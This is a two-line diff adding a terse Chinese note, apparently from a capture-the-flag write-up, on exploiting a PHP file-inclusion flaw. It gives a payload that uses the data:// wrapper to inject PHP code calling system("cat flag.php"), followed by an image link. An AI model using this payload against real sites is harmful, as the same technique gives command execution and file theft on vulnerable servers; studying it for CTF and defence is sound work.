@@ -1,0 +1,2 @@
+利用伪协议展示，f12查看即可：
+?file=data://text/plain,<?Php system("cat flag.php")![file_include.png](/images/common/753/0e962d05ea2e240b87a5b1016bd274ad.png);
